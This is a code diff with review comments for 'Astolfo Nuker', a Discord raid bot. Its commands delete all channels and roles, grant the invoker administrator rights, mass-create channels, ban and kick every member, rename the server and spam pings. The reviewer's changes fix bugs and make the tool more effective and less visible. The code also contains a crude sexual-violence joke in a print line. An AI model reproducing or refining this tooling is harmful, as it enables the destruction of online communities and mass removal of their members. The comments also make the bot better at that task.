@@ -1,15 +1,15 @@
 '''
 Femboyed by oAaron#0001
 '''
-from discord import Permissions
+from discord import Permissions #I like how you imported but never used
 import discord,random,time
 import json
-from discord.ext import commands, tasks
+from discord.ext import commands #Didn't need tasks
 import os 
 import colorama
 import asyncio
 from colorama import Fore
-from discord import Embed
+from discord import Embed #Also didn't use this, you just ended up doing discord.Embed
 colorama.init()
 intents = discord.Intents.all()
 bot = commands.Bot(command_prefix=">",intents=intents)
@@ -38,13 +38,12 @@ async def d(ctx,channel_id="all"):
         await channel.delete()
       else:
         continue
-    guild = ctx.message.guild
-    await guild.create_text_channel("nuked")
+    await ctx.guild.create_text_channel(name="nuked")
     print("Nuked All Channels")
     return
   else:
     try:
-      channel = ctx.get.channel(id=channel_id)
+      channel = ctx.get.channel(id=iny(channel_id))
       await channel.delete()
     except:
       e2 = discord.Embed(title = "Invaild Channel ID.", color = 0xaf1aff)
@@ -53,11 +52,11 @@ async def d(ctx,channel_id="all"):
 
 @bot.command(pass_context=True)
 async def admin(ctx):
+    await ctx.message.delete() # put this here since in the event it won't give you admin, the original message will not delete
     try:
         guild = ctx.guild
         role = await guild.create_role(name="Astfolo Nuker", permissions=discord.Permissions(8),colour=discord.Colour(000000))
         authour = ctx.message.author
-        await ctx.message.delete()
         await authour.add_roles(role)
         print("Gave you admin <3")
     except:
@@ -79,7 +78,7 @@ async def transrspam(ctx):
    print("Spamming roles <3")
 @bot.command()
 async def rdelete(ctx):
-  total_roles = ""
+  #total_roles = "" - why is this a thing?
   for role in ctx.guild.roles:
     try:
       await role.delete()
@@ -91,50 +90,52 @@ async def rdelete(ctx):
 
 
 @bot.command()
-async def cspam(ctx,times_reapet=10,name_of_channel="default"):
-  for times in range(times_reapet):
-    guild = ctx.message.guild
-    await guild.create_text_channel(name_of_channel)
-  em3 = discord.Embed(title = f"Im Done spamming ***{times_reapet}*** amount of channels named ***{name_of_channel}***", color = 0xaf1aff)
-  print(f"Spammed {times_reapet} Channels <3")
-  await ctx.message.delete()
+async def cspam(ctx,amount=10,name_of_channel="nuked"):
+  await ctx.message.delete() #Put this here since yes
+  for times in range(amount):
+    await ctx.guild.create_text_channel(name_of_channel)
+  em3 = discord.Embed(title = f"Im Done spamming ***{amount}*** amount of channels named ***{name_of_channel}***", color = 0xaf1aff)
+  print(f"Spammed {amount} Channels <3")
+
   await ctx.send(embed=em3)
 
 @bot.command()
-async def vcspam(ctx,times_reapet=10,name_of_channel="default"):
-  for times in range(times_reapet):
-    guild = ctx.message.guild
-    await guild.create_voice_channel(name_of_channel)
-  em3 = discord.Embed(title = f"Im Done spamming ***{times_reapet}*** amount of voice channels named ***{name_of_channel}***", color = 0xaf1aff)
-  print(f"Spammed {times_reapet} Voice Channels <3")
+async def vcspam(ctx,amount=10,name_of_channel="nuked"): 
   await ctx.message.delete()
+  for times in range(amount):
+    await ctx.guild.create_voice_channel(name_of_channel)
+  em3 = discord.Embed(title = f"Im Done spamming ***{amount}*** amount of voice channels named ***{name_of_channel}***", color = 0xaf1aff)
+  print(f"Spammed {amount} Voice Channels <3")
   await ctx.send(embed=em3)
 
 @bot.command()
 async def banAll(ctx):
- embed=discord.Embed(title="Done Banning All Members", color=0xaf1aff)
- await ctx.send(embed=embed)
+ #embed=discord.Embed(title="Done Banning All Members", color=0xaf1aff) Somewhat misleading lol
+ #await ctx.send(embed=embed)
  await ctx.message.delete()
- print("Banned All Members <3 ~")
+ #print("Banned All Members <3 ~")
  for user in ctx.guild.members:
         try:
             await user.ban()
+            print(f"Banned {user}")
         except:
            pass
 @bot.command()
 async def kickAll(ctx):
- embed=discord.Embed(title="Done Banning All Members", color=0xaf1aff)
- await ctx.send(embed=embed)
+ #embed=discord.Embed(title="Done Banning All Members", color=0xaf1aff) Misleading lol
+ #await ctx.send(embed=embed)
  await ctx.message.delete()
- print("Kicked all members <3 ~")
+ #print("Kicked all members <3 ~")
  for user in ctx.guild.members:
         try:
             await user.kick()
+            print(f"Kicked {user}")
         except:
            pass
 
 @bot.command()
 async def help(ctx):
+ await ctx.message.delete()
  embed1 = Embed(title="Astolfo Nuker Help", color=0xaf1aff)
  embed1.add_field(name=">help ", value="Sends This Message", inline=False)
  embed1.add_field(name=">cspam [Amount] Channel Name", value="Spams Channels", inline=True)
@@ -152,15 +153,14 @@ async def help(ctx):
  embed1.add_field(name=">lagspam", value="Lags Peoples Discords", inline=False)
  embed1.set_image(url="https://media.discordapp.net/attachments/837017058273263712/837752787545882656/1533773770_w_KamaroTheTrap.gif")     
  embed1.set_footer(text="By oAaron")
- embed2 = await ctx.send(embed=embed1)
- time.sleep(10)
- await embed2.delete()
- await ctx.message.delete()
+ await ctx.send(embed=embed1, delete_after=10)
+ #time.sleep(10) - this blocks async
+ #await embed2.delete() - There is a better way of doing this lol, just do delete_after
+ #await ctx.message.delete()
 
-
+#Pings can be done better ngl
 @bot.command()
 async def pingspam(ctx):
-    guild = ctx.message.guild
     await ctx.guild.edit(name="SERVER WIZZED")
     print("raped channels <3")
     latters = "a:b:c:d:e:f:g:h:i:j:k:l:m:n:o:p:q:r:s:t:u:v:w:x:y:,:+:*:/:#: "
@@ -200,9 +200,9 @@ async def servername(ctx, name = None):
     await ctx.guild.edit(name=f"{name}")
     print("Changed Server Name")
     em200 = Embed(color = 0xaf1aff, title=f"Changed the server name to: ***{ctx.guild.name}***")
-    em2001 = await ctx.send(embed=em200) 
-    time.sleep(8)
-    await em2001.delete()
+    await ctx.send(embed=em200, delete_after=8) 
+    #time.sleep(8) - better way of doing this + blocks async. Just do asyncio.sleep instead within async functions
+    #await em2001.delete()
   else:  
     em100 = Embed(color = 0xaf1aff, title=ctx.guild.name)
     em1001 = await ctx.send(embed=em100)
